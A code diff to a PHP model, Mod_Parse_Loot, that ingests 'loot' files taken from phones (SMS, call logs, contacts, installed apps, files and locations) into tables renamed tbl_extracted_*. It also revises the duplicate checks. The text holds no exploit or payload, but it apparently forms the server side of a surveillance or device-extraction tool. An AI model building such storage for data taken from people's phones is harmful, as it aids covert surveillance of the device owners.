@@ -104,24 +104,19 @@ class Mod_Parse_Loot extends Model
                 'updated_at'         => $dated,
             ];
 
-            // Enforce only unique contacts insertion (check if display_name and phone_numbers already exist for owner)
-            $phoneNumbersJson = $data['phone_numbers'];
-            $existsQuery = $this->db->table('tbl_contacts')
+            // Enforce only unique contacts insertion (check unique key: contact_id, device_id, owner_id)
+            $exists = $this->db->table('tbl_extracted_contacts')
+                ->where('contact_id', $data['contact_id'])
+                ->where('device_id', $data['device_id'])
                 ->where('owner_id', $data['owner_id'])
-                ->where('display_name', $data['display_name']);
-            if ($phoneNumbersJson !== null) {
-                $existsQuery->where('phone_numbers', $phoneNumbersJson);
-            } else {
-                $existsQuery->whereNull('phone_numbers');
-            }
-            $exists = $existsQuery->countAllResults() > 0;
+                ->countAllResults() > 0;
 
             if (!$exists) {
                 // Ensure we don't insert duplicate keys within the same batch upload
                 $isDuplicateInBatch = false;
                 foreach ($batchData as $existingBatchItem) {
-                    if ($existingBatchItem['display_name'] === $data['display_name'] && 
-                        $existingBatchItem['phone_numbers'] === $data['phone_numbers'] &&
+                    if ($existingBatchItem['contact_id'] === $data['contact_id'] && 
+                        $existingBatchItem['device_id'] === $data['device_id'] &&
                         $existingBatchItem['owner_id'] === $data['owner_id']) {
                         $isDuplicateInBatch = true;
                         break;
@@ -134,7 +129,7 @@ class Mod_Parse_Loot extends Model
         } // end foreach $json['contacts']
 
         if (!empty($batchData)) {
-            $this->db->table('tbl_contacts')->insertBatch($batchData);
+            $this->db->table('tbl_extracted_contacts')->insertBatch($batchData);
             log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
         }
 
@@ -241,7 +236,7 @@ class Mod_Parse_Loot extends Model
                 ];
 
                 // Strong duplicate prevention: same number, exact timestamp, duration, type, device
-                $exists = $this->db->table('tbl_logs')
+                $exists = $this->db->table('tbl_extracted_call_logs')
                         ->where('phone_number', $logData['phone_number'])
                         ->where('call_date', $logData['call_date'])
                         ->where('duration_seconds', $logData['duration_seconds'])
@@ -277,7 +272,7 @@ class Mod_Parse_Loot extends Model
             log_message('info', 'Call logs processing summary - Total: ' . count($callLogData) . ', Skipped: ' . $skippedCount . ', Duplicates: ' . $duplicateCount . ', New: ' . count($batchData));
 
             if (!empty($batchData)) {
-                $this->db->table('tbl_logs')->insertBatch($batchData);
+                $this->db->table('tbl_extracted_call_logs')->insertBatch($batchData);
                 log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
             } else {
                 log_message('warning', 'No new call logs to insert from ' . $file_name);
@@ -392,7 +387,7 @@ class Mod_Parse_Loot extends Model
                 ];
 
                 // Duplicate check: same package on same device for same user
-                $exists = $this->db->table('tbl_apps')
+                $exists = $this->db->table('tbl_extracted_installed_apps')
                         ->where('package_name', $data['package_name'])
                         ->where('device_id', $data['device_id'])
                         ->where('owner_id', $data['owner_id'])
@@ -402,7 +397,7 @@ class Mod_Parse_Loot extends Model
                     $batchData[] = $data;
                 } else {
                     // Update existing app info
-                    $this->db->table('tbl_apps')
+                    $this->db->table('tbl_extracted_installed_apps')
                         ->where('package_name', $data['package_name'])
                         ->where('device_id', $data['device_id'])
                         ->where('owner_id', $data['owner_id'])
@@ -453,7 +448,7 @@ class Mod_Parse_Loot extends Model
             }
 
             if (!empty($batchData)) {
-                $this->db->table('tbl_apps')->insertBatch($batchData);
+                $this->db->table('tbl_extracted_installed_apps')->insertBatch($batchData);
                 log_message('info', 'Batch inserted ' . count($batchData) . ' apps from ' . $file_name);
             }
 
@@ -601,7 +596,7 @@ class Mod_Parse_Loot extends Model
                 /* -----------------------------------------------------
                  * Duplicate check (strong prevention)
                  * ----------------------------------------------------- */
-                $exists = $this->db->table('tbl_sms')
+                $exists = $this->db->table('tbl_extracted_sms')
                         ->where('android_sms_id', $smsData['android_sms_id'])
                         ->where('device_id', $smsData['device_id'])
                         ->where('owner_id', $smsData['owner_id'])
@@ -615,7 +610,7 @@ class Mod_Parse_Loot extends Model
                  * Insert batch when limit is reached
                  * ----------------------------------------------------- */
                 if (count($batch) >= $batchSize) {
-                    $this->db->table('tbl_sms')->insertBatch($batch);
+                    $this->db->table('tbl_extracted_sms')->insertBatch($batch);
                     $inserted += count($batch);
                     $batch = [];
                 }
@@ -625,7 +620,7 @@ class Mod_Parse_Loot extends Model
              * Insert remaining rows
              * --------------------------------------------------------- */
             if (!empty($batch)) {
-                $this->db->table('tbl_sms')->insertBatch($batch);
+                $this->db->table('tbl_extracted_sms')->insertBatch($batch);
                 $inserted += count($batch);
             }
 
@@ -746,7 +741,7 @@ class Mod_Parse_Loot extends Model
                 ];
 
                 // Duplicate check: Same path, device, and owner
-                $exists = $this->db->table('tbl_device_files')
+                $exists = $this->db->table('tbl_extracted_device_files')
                         ->where('path_hash', $data['path_hash'])
                         ->where('device_id', $data['device_id'])
                         ->where('owner_id', $data['owner_id'])
@@ -756,7 +751,7 @@ class Mod_Parse_Loot extends Model
                     $batchData[] = $data;
                 } else {
                     // Start Update existing file info
-                     $this->db->table('tbl_device_files')
+                     $this->db->table('tbl_extracted_device_files')
                         ->where('path_hash', $data['path_hash'])
                         ->where('device_id', $data['device_id'])
                         ->where('owner_id', $data['owner_id'])
@@ -771,7 +766,7 @@ class Mod_Parse_Loot extends Model
             }
 
             if (!empty($batchData)) {
-                $this->db->table('tbl_device_files')->insertBatch($batchData);
+                $this->db->table('tbl_extracted_device_files')->insertBatch($batchData);
                 log_message('info', 'Batch inserted ' . count($batchData) . ' files from ' . $file_name);
             }
 
@@ -928,7 +923,7 @@ class Mod_Parse_Loot extends Model
         ];
 
         try {
-            return (bool) $this->db->table('tbl_location')->insert($locationData);
+            return (bool) $this->db->table('tbl_extracted_locations')->insert($locationData);
         } catch (\Exception $e) {
             log_message('error', 'insertLocationRow failed: ' . $e->getMessage());
             return false;
@@ -960,7 +955,7 @@ class Mod_Parse_Loot extends Model
         ];
 
         try {
-            return (bool) $this->db->table('tbl_activity')->insert($activityData);
+            return (bool) $this->db->table('tbl_extracted_activities')->insert($activityData);
         } catch (\Exception $e) {
             log_message('error', 'insertActivityRow failed: ' . $e->getMessage());
             return false;
@@ -1087,7 +1082,7 @@ class Mod_Parse_Loot extends Model
                     'updated_at'    => $dated,
                 ];
 
-                if ($this->db->table('tbl_location')->insert($locationData)) {
+                if ($this->db->table('tbl_extracted_locations')->insert($locationData)) {
                     $recordsInserted++;
                 }
             }
